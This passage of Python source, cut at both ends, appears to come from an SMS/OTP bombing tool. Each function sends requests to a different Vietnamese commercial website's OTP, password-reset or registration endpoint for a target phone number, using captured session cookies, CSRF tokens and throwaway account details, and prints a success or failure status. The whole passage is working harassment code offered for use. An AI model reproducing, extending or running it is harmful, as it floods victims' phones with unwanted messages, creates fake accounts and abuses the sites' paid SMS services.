        'bds123_session': 'TN25HFj4d9Yl39Cx2E2PkjeqOtmsAIN37IVY8Hwg',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6Imw2UkVLbVZSblhUT2NXaWF6SWZEMXc9PSIsInZhbHVlIjoiY2tWZkgwcDArZ2MvUEZiMXJEUTBHR0QwV0J2dDdTRkxMQlBNMUF6eTVxL2QxV3RiQWtyR2hOT3VMSURoTmo2TlNIU3phbmVKUDNpNnNEQzZoaCtja3F1STZaYVMyWEppN2ZkWmNJV2dDWTNHdGEwRHRkZFFMeFlmVDRMMG96RksiLCJtYWMiOiIyZDczMDYyMDExOTBjYTlkYjQ0YzUzYTQxMzVlNDU2ZjBjZGUxZjRhYWM2Y2VkYTM4ZmQ2NjkxZjI4N2I1MzIyIiwidGFnIjoiIn0%3D; bds123_session=TN25HFj4d9Yl39Cx2E2PkjeqOtmsAIN37IVY8Hwg',
        'origin': 'https://chothuenha.me',
        'priority': 'u=1, i',
        'referer': 'https://chothuenha.me/quen-mat-khau.html',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
        'x-csrf-token': 'a24jaHOAiS8EMjgzFM64DGLCOuVWAGJ1b4aac4WX',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_or_email': sdt,
        'action': 'forget_password',
    }

    try:
        response = requests.post('https://chothuenha.me/api/user/send-token', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CHOTHUENHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CHOTHUENHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gas24h():
    cookies = {
        'PHPSESSID': 'p6kcub50is0pof7jooio6k833t',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'PHPSESSID=p6kcub50is0pof7jooio6k833t',
        'priority': 'u=1, i',
        'referer': 'https://www.gas24h.com.vn/signup.html',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'otp[phone]': sdt,
        'otp[status]': '1',
    }

    try:
        response = requests.get('https://www.gas24h.com.vn/ajax/sendOtp', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GAS24H | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GAS24H | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def zl188():
    cookies = {
        '_require_login': '6',
        'XSRF-TOKEN': 'eyJpdiI6Im5sNkRSSE9YVlUrZ05JS1BrY2hwRFE9PSIsInZhbHVlIjoiSE5SNGdvNGlDalFcL2d4UzVFenRZVFh3XC83azljdU83dnVHTHdpb1wvV3cxVzVsRFNFbzliMDZKUlN3dTFYb2ozeGppM2J2ZTFLSHo5OERJOExieWZ5V0E9PSIsIm1hYyI6ImZiZmU1NTIwZWU1ZGFiNjU0MGNjZjNkMGM1MWRmZTZmMDAyMTc2ZGJhNDY3MTA3MzI1YTdiMDQ1M2M0OTQ3Y2QifQ%3D%3D',
        'laravel_session': 'eyJpdiI6IkRtaXdZSU5ackpUZ3NYMzFZM2xEQXc9PSIsInZhbHVlIjoiQ3JcL1wvbVhPWWR1cmFVMmg2VUZtTTQ5dmlVQnhCRkh0XC85amVnVUJBM1RHY2ZpSkF4VGNabmtTKzRQQnNndzh4MW5HS1UzbDFYV2tOS2UrVUNyMFJjcGc9PSIsIm1hYyI6Ijc3Njk2MTFiNjYxZmRhMWU4OTQ3NjJkOGEwYjViZWQ4ZjE5YWRhM2E2ZjhjMTM5NjMzOTgxMTRiMDJkMDNkMDEifQ%3D%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_require_login=6; XSRF-TOKEN=eyJpdiI6Im5sNkRSSE9YVlUrZ05JS1BrY2hwRFE9PSIsInZhbHVlIjoiSE5SNGdvNGlDalFcL2d4UzVFenRZVFh3XC83azljdU83dnVHTHdpb1wvV3cxVzVsRFNFbzliMDZKUlN3dTFYb2ozeGppM2J2ZTFLSHo5OERJOExieWZ5V0E9PSIsIm1hYyI6ImZiZmU1NTIwZWU1ZGFiNjU0MGNjZjNkMGM1MWRmZTZmMDAyMTc2ZGJhNDY3MTA3MzI1YTdiMDQ1M2M0OTQ3Y2QifQ%3D%3D; laravel_session=eyJpdiI6IkRtaXdZSU5ackpUZ3NYMzFZM2xEQXc9PSIsInZhbHVlIjoiQ3JcL1wvbVhPWWR1cmFVMmg2VUZtTTQ5dmlVQnhCRkh0XC85amVnVUJBM1RHY2ZpSkF4VGNabmtTKzRQQnNndzh4MW5HS1UzbDFYV2tOS2UrVUNyMFJjcGc9PSIsIm1hYyI6Ijc3Njk2MTFiNjYxZmRhMWU4OTQ3NjJkOGEwYjViZWQ4ZjE5YWRhM2E2ZjhjMTM5NjMzOTgxMTRiMDJkMDNkMDEifQ%3D%3D',
        'origin': 'https://188.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://188.com.vn/dang-ky',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': 'b3qklomjG8zOqwckTwnDwEgm8SQpq8j4j7diCTtE',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'otp_type': '1',
    }

    try:
        response = requests.post('https://188.com.vn/get-token-auth-phone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("188.COM.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("188.COM.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thuecanho123():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6InljSi9Qa2hrSGJZN1JKWXhGRHdQRHc9PSIsInZhbHVlIjoiZ3I5Vkl5VWVRa3JSR2ZVMmpHUlpmL3EwblRzM1NVYmZRSlZyNU1UQ1RlRnNRcG43anVEQ2k5WVE3U3JIWmlkM3dlNHo0TEd2TVBodVRQcFNsV1RNYXQwbGFDSllYTEdSaDFHRCtVUENjSloxNkNFMGZCYVNuRldSb2FCcTJ3K1MiLCJtYWMiOiJmMDQzMDM1MmIyZTkzYWVjYWQ0ODc3NDExMWI5NTg3OGQ5NTJmOTdiZTExNDM3MTQ3MzZkZjI2MTViMWMyM2IyIiwidGFnIjoiIn0%3D',
        'bds123_session': 'mQP2QFVqqsbagk6uPidb9S84xsal8D5xahuAaRtv',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6InljSi9Qa2hrSGJZN1JKWXhGRHdQRHc9PSIsInZhbHVlIjoiZ3I5Vkl5VWVRa3JSR2ZVMmpHUlpmL3EwblRzM1NVYmZRSlZyNU1UQ1RlRnNRcG43anVEQ2k5WVE3U3JIWmlkM3dlNHo0TEd2TVBodVRQcFNsV1RNYXQwbGFDSllYTEdSaDFHRCtVUENjSloxNkNFMGZCYVNuRldSb2FCcTJ3K1MiLCJtYWMiOiJmMDQzMDM1MmIyZTkzYWVjYWQ0ODc3NDExMWI5NTg3OGQ5NTJmOTdiZTExNDM3MTQ3MzZkZjI2MTViMWMyM2IyIiwidGFnIjoiIn0%3D; bds123_session=mQP2QFVqqsbagk6uPidb9S84xsal8D5xahuAaRtv',
        'origin': 'https://thuecanho123.com',
        'priority': 'u=1, i',
        'referer': 'https://thuecanho123.com/dang-ky.html',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': 'mNPC1k4l20XU3XaDaZ1PanuXLBSww0uhonPAEsqW',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc huuh',
        'phone': sdt,
        'password': '123123aA@',
        'user_type': '1',
    }

    response = requests.post('https://thuecanho123.com/api/user/register', cookies=cookies, headers=headers, data=data, verify=False)

    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IjlJOGt1bVZKZTZPdDR4OU01MUJyS1E9PSIsInZhbHVlIjoiWkFrOUd3ZVRSV001aDhHNEUxSDMrZzlpcEpOZFIxQ3UvNDY3c2V0SitvdnZsTy9jMWdoVmp6TlZqOFk1aUVoMXg5alBKM2NWcGU2dCtNNlozN2pvRmduMzhkMUEvUThFZFJkSm84bVc1cmNiWW5IclplZnR4OHBla0JBbFd0R1AiLCJtYWMiOiI1MzA1YmQ0MTZlNWQwODY1NGFjZjEzZjM1MTNlNDdhOTI2NTVkMzFhZWU1Y2FkMjBiMjVmMTU1YzJlYjRiMTYwIiwidGFnIjoiIn0%3D',
        'bds123_session': '4SbgDERk3VETc1Py5bVIMZfMWesuwPU1qNYFZPVF',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IjlJOGt1bVZKZTZPdDR4OU01MUJyS1E9PSIsInZhbHVlIjoiWkFrOUd3ZVRSV001aDhHNEUxSDMrZzlpcEpOZFIxQ3UvNDY3c2V0SitvdnZsTy9jMWdoVmp6TlZqOFk1aUVoMXg5alBKM2NWcGU2dCtNNlozN2pvRmduMzhkMUEvUThFZFJkSm84bVc1cmNiWW5IclplZnR4OHBla0JBbFd0R1AiLCJtYWMiOiI1MzA1YmQ0MTZlNWQwODY1NGFjZjEzZjM1MTNlNDdhOTI2NTVkMzFhZWU1Y2FkMjBiMjVmMTU1YzJlYjRiMTYwIiwidGFnIjoiIn0%3D; bds123_session=4SbgDERk3VETc1Py5bVIMZfMWesuwPU1qNYFZPVF',
        'origin': 'https://thuecanho123.com',
        'priority': 'u=1, i',
        'referer': 'https://thuecanho123.com/quen-mat-khau.html',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': 'eWFk4KXiuuacv2uEdpTnizciSYHcKgREHh8ly7a3',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_or_email': sdt,
        'action': 'forget_password',
    }

    try:
        response = requests.post('https://thuecanho123.com/api/user/send-token', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THUECANHO123 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THUECANHO123 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonszl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 2,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonszlresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': None,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSZLRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSZLRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonssms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 1,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def goldenspoonssmsresend():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://goldenspoons.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://goldenspoons.com.vn/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
        'type': 1,
        'language': 1,
        'provider': 1,
    }

    try:
        response = requests.post('https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/otp/resend', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOLDENSPOONSSMSRESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOLDENSPOONSSMSRESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sapporopremiumbeer():
    cookies = {
        'PHPSESSID': 'gvhp4edcj1de131btdjgn0nb50',
        '_pc_vis': '0299d3f0f9b96c38',
        '_pc_ses': '1728816472266',
        '_pc_tss': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3Mjg4MTY0NzUsInB0ZyI6eyJ2aTpzcnUiOls1MywxN10sIl9jIjoxNzI4ODE2NDcxLCJfdSI6MTcyODgxNjQ3MX0sImV4cCI6MTcyODgxODI3NX0.oC3Wta7iaE8UXy_c8k8mBu8qA5b-dNmhJ7SuFg3fLBA',
        '_pc_tvs': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3Mjg4MTY0NzUsInB0ZyI6eyJjbWY6c2ciOnsiODA0NSI6Mn0sIl9jIjoxNzI4ODE2NDcxLCJfdSI6MTcyODgxNjQ3NSwidGciOnsiNyI6Mn19LCJleHAiOjE3NjAzNTI0NzV9.UyAT5wDcahvZlQPlFUE9mXutJbPOxaJevGMnWBl1OsU',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'PHPSESSID=gvhp4edcj1de131btdjgn0nb50; _pc_vis=0299d3f0f9b96c38; _pc_ses=1728816472266; _pc_tss=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3Mjg4MTY0NzUsInB0ZyI6eyJ2aTpzcnUiOls1MywxN10sIl9jIjoxNzI4ODE2NDcxLCJfdSI6MTcyODgxNjQ3MX0sImV4cCI6MTcyODgxODI3NX0.oC3Wta7iaE8UXy_c8k8mBu8qA5b-dNmhJ7SuFg3fLBA; _pc_tvs=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3Mjg4MTY0NzUsInB0ZyI6eyJjbWY6c2ciOnsiODA0NSI6Mn0sIl9jIjoxNzI4ODE2NDcxLCJfdSI6MTcyODgxNjQ3NSwidGciOnsiNyI6Mn19LCJleHAiOjE3NjAzNTI0NzV9.UyAT5wDcahvZlQPlFUE9mXutJbPOxaJevGMnWBl1OsU',
        'origin': 'https://www.sapporopremiumbeer.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.sapporopremiumbeer.com.vn/vi_VN/account/register',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    data = {
        'registration_form[phone]': sdt,
        'registration_form[email]': '',
        'registration_form[password][first]': '123123aA@',
        'registration_form[password][second]': '123123aA@',
        'registration_form[fullname]': 'dat g',
        'registration_form[city]': 'Hà Nội',
        'registration_form[acceptTerm]': '1',
        'registration_form[oAuthKey]': '',
        'registration_form[utmSource]': 'StarSpin',
        'registration_form[utmMedium]': 'online',
        'registration_form[utmCampaign]': 'Star_Spin_Registration',
        'registration_form[utmTerm]': '',
        'registration_form[utmContent]': '',
        'registration_form[_submit]': '',
        'registration_form[_token]': 'izELzaCpUQJpHqRzAUoAwlSYSFgAiUDQ9CLAXnuFbpg',
    }

    try:
        response = requests.post(
            'https://www.sapporopremiumbeer.com.vn/vi_VN/account/register',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SAPPOROPREMIUMBEER | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPPOROPREMIUMBEER | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hoangphuc():
    cookies = {
        'mage-banners-cache-storage': '{}',
        'PHPSESSID': '07e806bedec57cc595b13d3966f0e09e',
        'form_key': 'zjWPp7y6SO39D6e7',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'form_key': 'zjWPp7y6SO39D6e7',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'private_content_version': '6b80c27f4a765dceffd8529d6a802732',
        'section_data_ids': '{%22messages%22:null}',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'mage-banners-cache-storage={}; PHPSESSID=07e806bedec57cc595b13d3966f0e09e; form_key=zjWPp7y6SO39D6e7; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; form_key=zjWPp7y6SO39D6e7; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; private_content_version=6b80c27f4a765dceffd8529d6a802732; section_data_ids={%22messages%22:null}',
        'origin': 'https://hoangphuconline.vn',
        'priority': 'u=1, i',
        'referer': 'https://hoangphuconline.vn/customer/account/create/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
        'form_key': 'zjWPp7y6SO39D6e7',
    }

    try:
        response = requests.post('https://hoangphuconline.vn/advancedlogin/otp/CheckVali/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOANGPHUC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOANGPHUC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def alothuocsi():
    cookies = {
        'PHPSESSID': 'cppj7ube3routm9fh9s1jvocpj',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=cppj7ube3routm9fh9s1jvocpj',
        'origin': 'https://alothuocsi.com',
        'priority': 'u=1, i',
        'referer': 'https://alothuocsi.com/dang-ky',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'area': '84',
        'phone': sdt,
        'username': '',
        'password': '',
        'classify': '1',
        'ref': 'aHR0cHM6Ly9hbG90aHVvY3NpLmNvbS90aGFuaC12aWVuL3F1YW4tbHk=',
        'type': '2',
    }

    try:
        response = requests.post('https://alothuocsi.com/signup/phone/ajax', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ALOTHUOCSI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ALOTHUOCSI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def alothuocsi2():
    cookies = {
        'PHPSESSID': 'cppj7ube3routm9fh9s1jvocpj',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=cppj7ube3routm9fh9s1jvocpj',
        'origin': 'https://alothuocsi.com',
        'priority': 'u=1, i',
        'referer': 'https://alothuocsi.com/quen-mat-khau',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'area': '84',
        'password': '',
        'ref': 'aHR0cHM6Ly9hbG90aHVvY3NpLmNvbS90aGFuaC12aWVuL3F1YW4tbHk=',
        'username': '',
        'type': '2',
        'phone': '{0}-{1}-{2}'.format(sdt[0:3], sdt[3:6], sdt[6:10]),
    }

    try:
        response = requests.post('https://alothuocsi.com/auth/forgot/password/phone/ajax', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ALOTHUOCSI2 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ALOTHUOCSI2 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def foodmapsms():
    cookies = {
        'visitedGroupIds': 'eyJpdiI6IlF2YXMydzlrWUxqMW9kVjNsZGY5S3c9PSIsInZhbHVlIjoiREFLdkNGZjJmKyt1NWJQOXVST2tCQT09IiwibWFjIjoiOTlmYmM1NmU0NTc2MGRmOGU0YjRkNWE1ZWRlODg4MDc4OTkyYzhjNGQ5YmU4MTYzMzdmM2IyYTUzYWMxOTU4NCJ9',
        'XSRF-TOKEN': 'eyJpdiI6IlM0M1loNGQzc1RnODdPUVZLR3J0cFE9PSIsInZhbHVlIjoidnJJYUY2eUQyQm9zbWNZMDRaWFpDTUVVRDZXeXh1QUNTeEk4MGliODFsSnlPSEluVWlVbzFUa0NuaGhub25UayIsIm1hYyI6ImIzMGY3YTc1ODIxNDBjZDRiZThiMTc0MDEzNDY3Zjg5YzU2YjgzNjJkMTRhYzEyYTdmYTljYjA1NjAzZjY0MzEifQ%3D%3D',
